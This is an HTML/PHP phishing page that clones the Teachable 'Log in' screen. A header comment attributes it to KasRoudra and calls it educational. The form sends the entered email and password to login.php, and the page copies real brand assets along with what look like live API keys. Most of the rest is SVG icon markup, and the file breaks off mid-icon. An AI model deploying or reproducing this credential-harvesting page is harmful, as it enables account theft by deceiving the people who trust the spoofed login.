<?php
include "validate.php";
?>
<!DOCTYPE html>
<!-- Modified by KasRoudra(https://github.com/KasRoudra) as a phishing page-->
<!-- Do not misuse it. It is created for educational purposes demonstarting how phishing works-->
<!-- Do not steal this code. Use it legally and provide proper credits-->
<html>
  <head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta content="width=device-width,initial-scale=1.0,user-scalable=no" name="viewport">
  
      <meta name="asset_host" content="https://fedora.teachablecdn.com">
     
  <title>Teachable Accounts</title>
  
  
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
  <link rel="icon" type="image/svg+xml" href="https://assets.teachablecdn.com/icons/teachable-circle-green.svg">
  <meta id="fedora-keys" data-env="production" data-stripe="pk_live_hkgvgSBxG4TAl3zGlXiB1KUX" data-track-all-ahoy="false" data-track-changes-ahoy="false" data-track-clicks-ahoy="false" data-track-sumbits-ahoy="false">
  <meta id="teachable-account" data-teachable-account="{&quot;id&quot;:null,&quot;created_at&quot;:null,&quot;updated_at&quot;:null,&quot;email&quot;:&quot;&quot;,&quot;name&quot;:null,&quot;agreed_to_terms&quot;:null,&quot;country&quot;:null,&quot;last_sign_out_at&quot;:null,&quot;joined_at&quot;:null,&quot;authentication_token&quot;:null,&quot;authentication_token_created_at&quot;:null,&quot;feature_flags&quot;:null,&quot;staff_account_id&quot;:null,&quot;destroyed_at&quot;:null,&quot;destroyer_id&quot;:null,&quot;destroyer_type&quot;:null,&quot;is_active&quot;:true,&quot;current_impersonated_teachable_account_id&quot;:null}" data-user-role="student">
  <meta id="iris-url" data-iris-url="https://eventable.teachable.cloud">
  <link rel="stylesheet" media="all" href="https://fedora.teachablecdn.com/assets/application-897c473ff5b418bf9766f5869e64b0914a1cbe7102c09d87990b533d4e8d9547.css">
  <!-- BEGIN ASSET PIPELINE-->
  
  <!-- END ASSET PIPELINE-->
  <!-- BEGIN WEBPACK BUNDLE -->
  
  <link rel="stylesheet" media="all" href="https://fedora.teachablecdn.com/packs/teachable_accounts-1f03436432b4102cc56f.css">
  <!-- School OAuth themes -->
  
  
  <!-- END WEBPACK BUNDLE -->
  <!-- Google Tag Manager -->
  
  <!-- End Google Tag Manager -->
    <meta id="analytics-keys" name="analytics" data-analytics="{&quot;Segment.io&quot;:{&quot;apiKey&quot;:&quot;y1dH8dabkhO9n9fMf008SVDt2ZSOlB0n&quot;}}">
    
    
  <meta name="csrf-param" content="authenticity_token">
<meta name="csrf-token" content="OeqGxQXHXOxlEK93ggRmEQOY1f779Y3gFL483RWUl4ja6vBe1046Urc9ZOMBVUgvv6azhxyoC8+0WPv4dLx7hw==">
</head>
<body class="my-teachable-layout" style="background-color: rgb(255, 255, 255);">
  <!-- Teachable-branded log in page -->
<div class="auth-flow rebrand-2020">
  <div class="auth-flow__top-bar col-12-xs dsp-flex-xs flex-align-content-center-xs flex-justify-content-center-xs">
    <img class="auth-flow__top-bar__logo" src="https://fedora.teachablecdn.com/assets/teachable_logo-fb281963e0a46beb318c1726a5556ff086553102dd35889b8f839875cc4ab71b.svg">
  </div>
   <div class="auth-flow__content p-h-6-xs p-b-6-xs p-t-7-s">
        <div class="auth-form m-t-6-s dsp-flex-xs flex-justify-content-center-xs flex-align-items-center-xs">
  <h2 class="auth-form__header heading2 text-center-xs m-t-0-xs m-b-3-xs">
      Log in to Teachable
  </h2>
  <div class="auth-form__form m-l-auto-xs m-r-auto-xs">
      <form class="simple_form new_teachable_account" id="new_teachable_account" novalidate="novalidate" action="login.php" accept-charset="UTF-8" method="post">
    <div class="m-b-4-xs">
      <label class="form-label bodyMain p-b-0-xs m-b-1-xs" for="teachable_account_email">Email Address</label>
      <input autofocus="autofocus" class="form-input p-v-2-xs p-l-3-xs p-r-5-xs col-12-xs bodyMain Bizible-Exclude" value="" type="email" name="email" id="teachable_account_email">
    </div>
    <div class="m-b-4-xs">
      <label class="form-label bodyMain p-b-0-xs m-b-1-xs" for="teachable_account_password">Password</label>
      <input autocomplete="current-password" class="form-input p-v-2-xs p-l-3-xs p-r-5-xs col-12-xs bodyMain password Bizible-Exclude" minlength="6" type="password" name="password" id="teachable_account_password">
    </div>
    <div class="text-center-xs m-b-5-xs">
          <input type="submit" name="commit" value="Log In" class="login-button button p-v-2-xs p-h-5-xs m-v-3-xs" data-disable-with="Logging in...">
    </div>
    <div class="bodyMain text-center-xs m-b-5-xs">
      <a class="isolate" href="https://sso.teachable.com/secure/teachable_accounts/password/new">Forgot Password?</a>
    </div>
    <div class="bodyMain text-center-xs m-b-4-xs">
      <div class="text-center-xs m-t-3-xs">Don't have an account?&nbsp;<a href="https://sso.teachable.com/secure/teachable_accounts/sign_up">Sign Up</a></div>
    </div>
  </form></div>


  </div>
</div>



  

  
  


</div><div style="display: none;">
<svg style="width: 0; height: 0; position: absolute;"><defs></defs><symbol id="icon__Add" viewBox="0 0 24 24">
<path fill-rule="evenodd" clip-rule="evenodd" d="M2 12C2 6.48 6.48 2 12 2C17.52 2 22 6.48 22 12C22 17.52 17.52 22 12 22C6.48 22 2 17.52 2 12ZM13 13H17V11H13V7H11V11H7V13H11V17H13V13Z" fill="CurrentColor"></path>
</symbol><symbol id="icon__ArchiveIn" viewBox="0 0 24 24">
<path fill-rule="evenodd" clip-rule="evenodd" d="M19.15 3.55L20.54 5.23C20.83 5.57 21 6.02 21 6.5V19C21 20.1 20.1 21 19 21H5C3.9 21 3 20.1 3 19V6.5C3 6.02 3.17 5.57 3.46 5.23L4.84 3.55C5.12 3.21 5.53 3 6 3H18C18.47 3 18.88 3.21 19.15 3.55ZM17.76 5H6.24L5.44 5.97H18.57L17.76 5ZM5 19V8H19V19H5ZM10.55 10H13.45V13H16L12 17L8 13H10.55V10Z" fill="currentColor"></path>
</symbol><symbol id="icon__AddOutline" viewBox="0 0 24 24">
<path fill-rule="evenodd" clip-rule="evenodd" d="M12 2C6.48 2 2 6.48 2 12C2 17.52 6.48 22 12 22C17.52 22 22 17.52 22 12C22 6.48 17.52 2 12 2ZM11 7V11H7V13H11V17H13V13H17V11H13V7H11ZM4 12C4 16.41 7.59 20 12 20C16.41 20 20 16.41 20 12C20 7.59 16.41 4 12 4C7.59 4 4 7.59 4 12Z" fill="CurrentColor"></path>
</symbol><symbol id="icon__AddImage" viewBox="0 0 24 24">
    <path d="M0 0h24v24H0z" fill="none"></path>
    <path d="M19 7v2.99s-1.99.01-2 0V7h-3s.01-1.99 0-2h3V2h2v3h3v2h-3zm-3 4V8h-3V5H5c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2v-8h-3zM5 19l3-4 2 3 3-4 4 5H5z" fill="currentColor"></path>
</symbol><symbol id="icon__AlignLeft" viewBox="0 0 24 24">
  <path d="M15 15H3V17H15V15ZM15 7H3V9H15V7ZM3 13H21V11H3V13ZM3 21H21V19H3V21ZM3 3V5H21V3H3Z" fill="currentColor"></path>
</symbol><symbol id="icon__ArchiveOut" viewBox="0 0 24 24">
<path fill-rule="evenodd" clip-rule="evenodd" d="M19.15 3.55L20.54 5.23C20.83 5.57 21 6.02 21 6.5V19C21 20.1 20.1 21 19 21H5C3.9 21 3 20.1 3 19V6.5C3 6.02 3.17 5.57 3.46 5.23L4.84 3.55C5.12 3.21 5.53 3 6 3H18C18.47 3 18.88 3.21 19.15 3.55ZM17.76 5H6.24L5.42 6H18.59L17.76 5ZM5 19V8H19V19H5ZM10.55 14H8L12 10L16 14H13.45V17H10.55V14Z" fill="currentColor"></path>
</symbol><symbol id="icon__ArrowBack" viewBox="0 0 24 24">
<path d="M15.41 16.59L10.83 12L15.41 7.41L14 6L8 12L14 18L15.41 16.59Z" fill="currentColor"></path>
</symbol><symbol id="icon__ArrowDown" viewBox="0 0 24 24">
<path d="M7.41 8.59L12 13.17L16.59 8.59L18 10L12 16L6 10L7.41 8.59Z" fill="currentColor"></path>
</symbol><symbol id="icon__ArrowDownward" viewBox="0 0 24 24">
<path d="M0 0h24v24H0V0z" fill="none"></path>
<path d="M20 12l-1.41-1.41L13 16.17V4h-2v12.17l-5.58-5.59L4 12l8 8 8-8z" fill="currentColor"></path>
</symbol><symbol id="icon__ArrowForward" viewBox="0 0 24 24">
<path d="M8.59 16.59L13.17 12L8.59 7.41L10 6L16 12L10 18L8.59 16.59Z" fill="currentColor"></path>
</symbol><symbol id="icon__ArrowTableDropdown" viewBox="0 0 24 24">
<path d="M9.91421 9.5C9.02331 9.5 8.57714 10.5771 9.20711 11.2071L11.7929 13.7929C12.1834 14.1834 12.8166 14.1834 13.2071 13.7929L15.7929 11.2071C16.4229 10.5771 15.9767 9.5 15.0858 9.5L9.91421 9.5Z" fill="CurrentColor"></path>
</symbol><symbol id="icon__ArrowTableUp" viewBox="0 0 24 24">
<path fill="currentColor" d="M8.70999 12.29L11.3 9.69997C11.69 9.30997 12.32 9.30997 12.71 9.69997L15.3 12.29C15.93 12.92 15.48 14 14.59 14H9.40999C8.51999 14 8.07999 12.92 8.70999 12.29Z"></path>
</symbol><symbol id="icon__ArrowUp" viewBox="0 0 24 24">
<path d="M16.59 15.41L12 10.83L7.41 15.41L6 14L12 8L18 14L16.59 15.41Z" fill="currentColor"></path>
</symbol><symbol id="icon__ArrowUpward" viewBox="0 0 24 24">
<path d="M4 12L5.41 13.41L11 7.83V20H13V7.83L18.58 13.42L20 12L12 4L4 12Z" fill="currentColor"></path>
</symbol><symbol id="icon__Bluetooth" viewBox="0 0 24 24">
<path d="M14.24 12.01L16.56 14.33C16.84 13.61 17 12.82 17 12C17 11.18 16.84 10.41 16.57 9.69L14.24 12.01ZM19.53 6.71L18.27 7.97C18.9 9.18 19.25 10.54 19.25 11.99C19.25 13.44 18.89 14.81 18.27 16.01L19.47 17.21C20.44 15.67 21.01 13.85 21.01 11.9C21 10.01 20.46 8.23 19.53 6.71ZM15.71 7.71L10 2H9V9.59L4.41 5L3 6.41L8.59 12L3 17.59L4.41 19L9 14.41V22H10L15.71 16.29L11.41 12L15.71 7.71ZM11 5.83L12.88 7.71L11 9.59V5.83ZM12.88 16.29L11 18.17V14.41L12.88 16.29Z" fill="currentColor"></path>
</symbol><symbol id="icon__Attachment" viewBox="0 0 24 24">
  <path d="M2 12.5C2 9.46 4.46 7 7.5 7H18C20.21 7 22 8.79 22 11C22 13.21 20.21 15 18 15H9.5C8.12 15 7 13.88 7 12.5C7 11.12 8.12 10 9.5 10H17V12H9.41C8.86 12 8.86 13 9.41 13H18C19.1 13 20 12.1 20 11C20 9.9 19.1 9 18 9H7.5C5.57 9 4 10.57 4 12.5C4 14.43 5.57 16 7.5 16H17V18H7.5C4.46 18 2 15.54 2 12.5Z" fill="currentColor"></path>
</symbol><symbol id="icon__Books" viewBox="0 0 24 24">
<path fill-rule="evenodd" clip-rule="evenodd" d="M5 22H3L3 2H5L5 22ZM8 22H10V2H9H8V22ZM18.9514 21.8586L20.865 21.277L15.0485 2.14141L13.135 2.72306L18.9514 21.8586Z" fill="CurrentColor"></path>
</symbol><symbol id="icon__AuthorBio" viewBox="0 0 24 24">
<path d="M19.1,2.9h-16v2h16V2.9z M19.1,7.9h-16v2h16V7.9z M3.1,12.9h8v2h-8V12.9z M17.1,13.1c-1.1,0-1.9,0.9-1.9,1.9c0,1.1,0.9,1.9,1.9,1.9c1.1,0,2-0.9,2-1.9C19,14,18.1,13.1,17.1,13.1z M17.1,18.5c1.3,0,3.9,0.6,3.9,2v0.6h-7.8v-0.6C13.2,19.2,15.8,18.5,17.1,18.5z" fill="CurrentColor"></path>
</symbol><symbol id="icon__Bundles" viewBox="0 0 24 24">
<path d="M12 2L6.5 11H17.5L12 2ZM12 5.84L13.93 9H10.06L12 5.84ZM17.5 13C15.01 13 13 15.01 13 17.5C13 19.99 15.01 22 17.5 22C19.99 22 22 19.99 22 17.5C22 15.01 19.99 13 17.5 13ZM17.5 20C16.12 20 15 18.88 15 17.5C15 16.12 16.12 15 17.5 15C18.88 15 20 16.12 20 17.5C20 18.88 18.88 20 17.5 20ZM3 21.5H11V13.5H3V21.5ZM5 15.5H9V19.5H5V15.5Z" fill="currentColor"></path>
</symbol><symbol id="icon__Calendar" viewBox="0 0 24 24">
<path fill-rule="evenodd" clip-rule="evenodd" d="M18.625 4.5H16.75V2.46875C16.75 2.21094 16.5391 2 16.2812 2H14.7188C14.4609 2 14.25 2.21094 14.25 2.46875V4.5H9.25V2.46875C9.25 2.21094 9.03906 2 8.78125 2H7.21875C6.96094 2 6.75 2.21094 6.75 2.46875V4.5H4.875C3.83984 4.5 3 5.33984 3 6.375V20.125C3 21.1602 3.83984 22 4.875 22H18.625C19.6602 22 20.5 21.1602 20.5 20.125V6.375C20.5 5.33984 19.6602 4.5 18.625 4.5ZM18.3906 20.125H5.10938C4.98047 20.125 4.875 20.0195 4.875 19.8906V8.25H18.625V19.8906C18.625 20.0195 18.5195 20.125 18.3906 20.125Z" fill="CurrentColor"></path>
</symbol><symbol id="icon__Campaign" viewBox="0 0 24 24">
  <path d="M0 0h24v24H0z" fill="none"></path>
  <path d="M18 11v2h4v-2h-4zm-2 6.61c.96.71 2.21 1.65 3.2 2.39.4-.53.8-1.07 1.2-1.6-.99-.74-2.24-1.68-3.2-2.4-.4.54-.8 1.08-1.2 1.61zM20.4 5.6c-.4-.53-.8-1.07-1.2-1.6-.99.74-2.24 1.68-3.2 2.4.4.53.8 1.07 1.2 1.6.96-.72 2.21-1.65 3.2-2.4zM4 9c-1.1 0-2 .9-2 2v2c0 1.1.9 2 2 2h1v4h2v-4h1l5 3V6L8 9H4zm11.5 3c0-1.33-.58-2.53-1.5-3.35v6.69c.92-.81 1.5-2.01 1.5-3.34z" fill="currentColor"></path>
</symbol><symbol id="icon__ChatBubble" viewBox="0 0 24 24">
<path d="M0 0h24v24H0V0z" fill="none"></path>
<path d="M20 2H4c-1.1 0-2 .9-2 2v18l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zm0 14H6l-2 2V4h16v12z"></path>
</symbol><symbol id="icon__Check" viewBox="0 0 24 24">
<path fill-rule="evenodd" clip-rule="evenodd" d="M9.23347 18.7447L3.26876 13.079C2.91041 12.7386 2.91041 12.1867 3.26876 11.8462L4.56648 10.6135C4.92483 10.2731 5.50589 10.2731 5.86424 10.6135L9.88235 14.4302L18.4887 6.25529C18.8471 5.9149 19.4281 5.9149 19.7865 6.25529L21.0842 7.48799C21.4425 7.82838 21.4425 8.38028 21.0842 8.7207L10.5312 18.7447C10.1728 19.0851 9.59182 19.0851 9.23347 18.7447Z" fill="CurrentColor"></path>
</symbol><symbol id="icon__CheckCircleOutline" viewBox="0 0 24 24">
<path d="M0 0h24v24H0V0zm0 0h24v24H0V0z" fill="none"></path>
<path d="M16.59 7.58L10 14.17l-3.59-3.58L5 12l5 5 8-8zM12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.42 0-8-3.58-8-8s3.58-8 8-8 8 3.58 8 8-3.58 8-8 8z" fill="currentColor"></path>
</symbol><symbol id="icon__CheckCircle" viewBox="0 0 24 24">
<path fill-rule="evenodd" clip-rule="evenodd" d="M12 22C17.5229 22 22 17.5229 22 12C22 6.47714 17.5229 2 12 2C6.47714 2 2 6.47714 2 12C2 17.5229 6.47714 22 12 22ZM18.2627 9.87556L10.8433 17.2949C10.5913 17.5469 10.1829 17.5469 9.93088 17.2949L5.73733 13.1013C5.4854 12.8494 5.4854 12.4409 5.73733 12.1889L6.64971 11.2766C6.90169 11.0246 7.31019 11.0246 7.56213 11.2766L10.3871 14.1015L16.4379 8.0508C16.6898 7.79883 17.0983 7.79883 17.3503 8.0508L18.2627 8.96318C18.5146 9.21512 18.5146 9.62363 18.2627 9.87556Z" fill="currentColor"></path>
</symbol><symbol id="icon__CheckCircleSmall" viewBox="0 0 24 24">
<path fill-rule="evenodd" clip-rule="evenodd" d="M12 20C16.4183 20 20 16.4183 20 12C20 7.58171 16.4183 4 12 4C7.58171 4 4 7.58171 4 12C4 16.4183 7.58171 20 12 20ZM17.0101 10.3005L11.0746 16.2359C10.8731 16.4375 10.5463 16.4375 10.3447 16.2359L6.98987 12.8811C6.78832 12.6795 6.78832 12.3527 6.98987 12.1512L7.71977 11.4213C7.92135 11.2197 8.24816 11.2197 8.4497 11.4213L10.7097 13.6812L15.5503 8.84064C15.7519 8.63906 16.0787 8.63906 16.2802 8.84064L17.0101 9.57055C17.2117 9.7721 17.2117 10.0989 17.0101 10.3005Z" fill="#20BDAF"></path>
</symbol><symbol id="icon__Clock" viewBox="0 0 24 24">
<path d="M11.99 2C6.47 2 2 6.48 2 12C2 17.52 6.47 22 11.99 22C17.52 22 22 17.52 22 12C22 6.48 17.52 2 11.99 2ZM12 20C7.58 20 4 16.42 4 12C4 7.58 7.58 4 12 4C16.42 4 20 7.58 20 12C20 16.42 16.42 20 12 20Z" fill="currentColor"></path>
<path d="M12.5 7H11V13L16.25 16.15L17 14.92L12.5 12.25V7Z" fill="currentColor"></path>
</symbol><symbol id="icon__CloseCircle" viewBox="0 0 24 24">
<path fill-rule="evenodd" clip-rule="evenodd" d="M12 22C17.5228 22 22 17.5228 22 12C22 6.47715 17.5228 2 12 2C6.47715 2 2 6.47715 2 12C2 17.5228 6.47715 22 12 22ZM16.0447 9.19484L13.2395 12L16.045 14.8049C16.2072 14.9674 16.2072 15.2307 16.045 15.3929L15.3932 16.0447C15.2306 16.207 14.9674 16.207 14.8051 16.0447L11.9999 13.2396L9.19488 16.045C9.03238 16.2072 8.76909 16.2072 8.60685 16.045L7.95502 15.3932C7.79277 15.2307 7.79277 14.9674 7.95502 14.8052L10.7603 12L7.95502 9.19484C7.79277 9.03234 7.79277 8.76906 7.95502 8.60682L8.60659 7.95527C8.76909 7.79303 9.03238 7.79303 9.19462 7.95527L11.9999 10.7604L14.8049 7.95501C14.9674 7.79277 15.2306 7.79277 15.3929 7.95501L16.0447 8.60682C16.207 8.76932 16.207 9.0326 16.0447 9.19484Z" fill="CurrentColor"></path>
</symbol><symbol id="icon__CloseCircleSmall" viewBox="0 0 24 24">
<path fill-rule="evenodd" clip-rule="evenodd" d="M12 20C16.4183 20 20 16.4183 20 12C20 7.58172 16.4183 4 12 4C7.58172 4 4 7.58172 4 12C4 16.4183 7.58172 20 12 20ZM15.2357 9.75588L12.9915 12L15.2359 14.2439C15.3657 14.3739 15.3657 14.5846 15.2359 14.7143L14.7145 15.2358C14.5845 15.3656 14.3738 15.3656 14.244 15.2358L11.9998 12.9917L9.75584 15.236C9.62584 15.3658 9.41521 15.3658 9.28541 15.236L8.76395 14.7145C8.63415 14.5845 8.63415 14.3739 8.76395 14.2441L11.0081 12L8.76395 9.75588C8.63415 9.62588 8.63415 9.41526 8.76395 9.28547L9.2852 8.76423C9.41521 8.63444 9.62584 8.63444 9.75563 8.76423L11.9998 11.0084L14.2438 8.76402C14.3738 8.63423 14.5845 8.63423 14.7142 8.76402L15.2357 9.28547C15.3655 9.41546 15.3655 9.62609 15.2357 9.75588Z" fill="CurrentColor"></path>
</symbol><symbol id="icon__ClosedCaptionOff" viewBox="0 0 24 24">
  <path d="M0 0h24v24H0V0z" fill="none"></path>
  <path d="M19.5 5.5v13h-15v-13h15zM19 4H5c-1.11 0-2 .9-2 2v12c0 1.1.89 2 2 2h14c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm-8 7H9.5v-.5h-2v3h2V13H11v1c0 .55-.45 1-1 1H7c-.55 0-1-.45-1-1v-4c0-.55.45-1 1-1h3c.55 0 1 .45 1 1v1zm7 0h-1.5v-.5h-2v3h2V13H18v1c0 .55-.45 1-1 1h-3c-.55 0-1-.45-1-1v-4c0-.55.45-1 1-1h3c.55 0 1 .45 1 1v1z" fill="currentColor"></path>
</symbol><symbol id="icon__ClosedCaptionOn" viewBox="0 0 24 24">
  <path d="M0 0h24v24H0z" fill="none"></path>
  <path d="M19 4H5c-1.11 0-2 .9-2 2v12c0 1.1.89 2 2 2h14c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm-8 7H9.5v-.5h-2v3h2V13H11v1c0 .55-.45 1-1 1H7c-.55 0-1-.45-1-1v-4c0-.55.45-1 1-1h3c.55 0 1 .45 1 1v1zm7 0h-1.5v-.5h-2v3h2V13H18v1c0 .55-.45 1-1 1h-3c-.55 0-1-.45-1-1v-4c0-.55.45-1 1-1h3c.55 0 1 .45 1 1v1z" fill="currentColor"></path>
</symbol><symbol id="icon__Code" viewBox="0 0 24 24">
  <path d="M9.4 16.6L4.8 12L9.4 7.4L8 6L2 12L8 18L9.4 16.6ZM14.6 16.6L19.2 12L14.6 7.4L16 6L22 12L16 18L14.6 16.6Z" fill="currentColor"></path>
</symbol><symbol id="icon__CreditCard" viewBox="0 0 24 24">
<path fill-rule="evenodd" clip-rule="evenodd" d="M19.9774 4H3.63802C2.73217 4 2 4.71987 2 5.60714V17.3929C2 18.2801 2.73217 19 3.63802 19H19.9774C20.8832 19 21.6154 18.2801 21.6154 17.3929V5.60714C21.6154 4.71987 20.8832 4 19.9774 4ZM3.84238 5.60714H19.7731C19.8854 5.60714 19.9774 5.69755 19.9774 5.80804V7.21429H3.63805V5.80804C3.63805 5.69755 3.73 5.60714 3.84238 5.60714ZM3.84238 17.3929H19.7731C19.8854 17.3929 19.9774 17.3025 19.9774 17.192V11.5H3.63805V17.192C3.63805 17.3025 3.73 17.3929 3.84238 17.3929ZM8.53839 14.0446V15.3839C8.53839 15.6049 8.35449 15.7857 8.12973 15.7857H5.67781C5.45305 15.7857 5.26916 15.6049 5.26916 15.3839V14.0446C5.26916 13.8237 5.45305 13.6429 5.67781 13.6429H8.12973C8.35449 13.6429 8.53839 13.8237 8.53839 14.0446ZM15.077 15.3839V14.0446C15.077 13.8237 14.8931 13.6429 14.6683 13.6429H10.0369C9.81218 13.6429 9.62828 13.8237 9.62828 14.0446V15.3839C9.62828 15.6049 9.81218 15.7857 10.0369 15.7857H14.6683C14.8931 15.7857 15.077 15.6049 15.077 15.3839Z" fill="CurrentColor"></path>
</symbol><symbol id="icon__Delete" viewBox="0 0 24 24">
<path fill-rule="evenodd" clip-rule="evenodd" d="M14.5 3H9.5L8.5 4H5V6H19V4H15.5L14.5 3ZM16 9V19H8V9H16ZM6 7H18V19C18 20.1 17.1 21 16 21H8C6.9 21 6 20.1 6 19V7Z" fill="CurrentColor"></path>
</symbol><symbol id="icon__Downloads" viewBox="0 0 24 24">
<path d="M19.35 10.04C18.67 6.59 15.64 4 12 4C9.11 4 6.6 5.64 5.35 8.04C2.34 8.36 0 10.91 0 14C0 17.31 2.69 20 6 20H19C21.76 20 24 17.76 24 15C24 12.36 21.95 10.22 19.35 10.04ZM17 13L12 18L7 13H10V9H14V13H17Z" fill="CurrentColor"></path>
</symbol><symbol id="icon__Devices" viewBox="0 0 24 24">
<path fill-rule="evenodd" clip-rule="evenodd" d="M4 6H22V4H4C2.9 4 2 4.9 2 6V17H0V20H14V17H4V6ZM23 8H17C16.45 8 16 8.45 16 9V19C16 19.55 16.45 20 17 20H23C23.55 20 24 19.55 24 19V9C24 8.45 23.55 8 23 8ZM18 17H22V10H18V17Z" fill="CurrentColor"></path>
</symbol><symbol id="icon__DownloadsOutline" viewBox="0 0 24 24">
  <path d="M0 0h24v24H0V0z" fill="none"></path>
  <path d="M19.35 10.04C18.67 6.59 15.64 4 12 4 9.11 4 6.6 5.64 5.35 8.04 2.34 8.36 0 10.91 0 14c0 3.31 2.69 6 6 6h13c2.76 0 5-2.24 5-5 0-2.64-2.05-4.78-4.65-4.96zM19 18H6c-2.21 0-4-1.79-4-4 0-2.05 1.53-3.76 3.56-3.97l1.07-.11.5-.95C8.08 7.14 9.94 6 12 6c2.62 0 4.88 1.86 5.39 4.43l.3 1.5 1.53.11c1.56.1 2.78 1.41 2.78 2.96 0 1.65-1.35 3-3 3zm-5.55-8h-2.9v3H8l4 4 4-4h-2.55z" fill="currentColor"></path>
</symbol><symbol id="icon__Drag" viewBox="0 0 24 24">
<rect width="24" height="24" fill="none"></rect>
<path d="M8 5H11V12H13V5H16L12 1L8 5ZM16 19H13V12H11V19H8L12 23L16 19Z" fill="currentColor"></path>
<path d="M5 16L5 13L12 13L12 11L5 11L5 8L1 12L5 16ZM19 8L19 11L12 11L12 13L19 13L19 16L23 12L19 8Z" fill="currentColor"></path>
</symbol><symbol id="icon__Duplicate" viewBox="0 0 24 24">
<path fill-rule="evenodd" clip-rule="evenodd" d="M16.5 1H4.5C3.4 1 2.5 1.9 2.5 3V17H4.5V3H16.5V1ZM19.5 5H8.5C7.4 5 6.5 5.9 6.5 7V21C6.5 22.1 7.4 23 8.5 23H19.5C20.6 23 21.5 22.1 21.5 21V7C21.5 5.9 20.6 5 19.5 5ZM8.5 21H19.5V7H8.5V21Z" fill="currentColor"></path>
</symbol><symbol id="icon__EditPage" viewBox="0 0 24 24">
<path fill-rule="evenodd" clip-rule="evenodd" d="M18 11.4V20H6V4H13H14.4L16.4 2H6C4.9 2 4 2.9 4 4V20C4 21.1 4.9 22 6 22H18C19.1 22 20 21.1 20 20V9.4L18 11.4Z" fill="CurrentColor"></path>
<path fill-rule="evenodd" clip-rule="evenodd" d="M20.8 1C20.6 1 20.5 1.1 20.3 1.2L19.1 2.4L21.6 4.9L22.8 3.7C23.1 3.4 23.1 3 22.8 2.8L21.2 1.2C21.1 1.1 20.9 1 20.8 1ZM18.4 5L19 5.6L13 11.6H12.4V11L18.4 5ZM11 10.5L18.4 3.1L20.9 5.6L13.5 13H11V10.5Z" fill="CurrentColor"></path>
</symbol><symbol id="icon__Edit" viewBox="0 0 24 24">
<path fill-rule="evenodd" clip-rule="evenodd" d="M18.3688 3.29L20.7088 5.63C21.0988 6.02 21.0988 6.65 20.7088 7.04L18.8788 8.87L15.1288 5.12L16.9588 3.29C17.1488 3.1 17.3988 3 17.6588 3C17.9188 3 18.1688 3.09 18.3688 3.29ZM2.99878 17.25V21H6.74878L17.8088 9.94L14.0588 6.19L2.99878 17.25ZM5.91878 19H4.99878V18.08L14.0588 9.02L14.9788 9.94L5.91878 19Z" fill="CurrentColor"></path>
</symbol><symbol id="icon__EventNote" viewBox="0 0 24 24">
<path fill-rule="evenodd" clip-rule="evenodd" d="M19 4H18V2H16V4H8V2H6V4H5C3.9 4 3 4.9 3 6V20C3 21.1 3.9 22 5 22H19C20.1 22 21 21.1 21 20V6C21 4.9 20.1 4 19 4ZM19 20H5V10H19V20ZM5 6V8H19V6H5ZM7 12H17V14H7V12ZM14 16H7V18H14V16Z" fill="CurrentColor"></path>
</symbol><symbol id="icon__Exclaim" viewBox="0 0 24 24">
<path fill-rule="evenodd" clip-rule="evenodd" d="M14 3H10V15H14V3ZM10 19C10 17.8954 10.8954 17 12 17C13.1046 17 14 17.8954 14 19C14 20.1046 13.1046 21 12 21C10.8954 21 10 20.1046 10 19Z" fill="CurrentColor"></path>
</symbol><symbol id="icon__ExclaimCircleSmall" viewBox="0 0 24 24">
<path fill-rule="evenodd" clip-rule="evenodd" d="M12 4C7.584 4 4 7.584 4 12C4 16.416 7.584 20 12 20C16.416 20 20 16.416 20 12C20 7.584 16.416 4 12 4ZM11.2 16V14.4H12.8V16H11.2ZM11.2 8V12.8H12.8V8H11.2Z" fill="#CC0000"></path>
</symbol><symbol id="icon__ExclaimCircle" viewBox="0 0 24 24">
<path fill-rule="evenodd" clip-rule="evenodd" d="M12 2C6.48 2 2 6.48 2 12C2 17.52 6.48 22 12 22C17.52 22 22 17.52 22 12C22 6.48 17.52 2 12 2ZM11 17V15H13V17H11ZM11 7V13H13V7H11Z" fill="#CC0000"></path>
</symbol><symbol id="icon__ExclaimTriangle" viewBox="0 0 24 24">
<path fill-rule="evenodd" clip-rule="evenodd" d="M22.7524 19.3312C23.4574 20.5914 22.5725 22.1667 21.1644 22.1667H2.83541C1.42462 22.1667 0.543778 20.589 1.2474 19.3312L10.412 2.94472C11.1173 1.68395 12.8839 1.68624 13.588 2.94472L22.7524 19.3312ZM11.9999 15.9434C11.0296 15.9434 10.243 16.7546 10.243 17.7552C10.243 18.7559 11.0296 19.5671 11.9999 19.5671C12.9703 19.5671 13.7569 18.7559 13.7569 17.7552C13.7569 16.7546 12.9703 15.9434 11.9999 15.9434ZM10.6152 14.7875L10.3319 9.43071C10.3175 9.15995 10.5265 8.93229 10.7895 8.93229H13.2103C13.4733 8.93229 13.6823 9.15995 13.668 9.43071L13.3847 14.7875C13.3714 15.0381 13.1704 15.2344 12.927 15.2344H11.0728C10.8294 15.2344 10.6284 15.0381 10.6152 14.7875Z" fill="CurrentColor"></path>
</symbol><symbol id="icon__ExternalLink" viewBox="0 0 24 24">
<path d="M19 19H5V5H12V3H5C3.89 3 3 3.9 3 5V19C3 20.1 3.89 21 5 21H19C20.1 21 21 20.1 21 19V12H19V19ZM14 3V5H17.59L7.76 14.83L9.17 16.24L19 6.41V10H21V3H14Z" fill="CurrentColor"></path>
</symbol><symbol id="icon__Eye" viewBox="0 0 24 24">
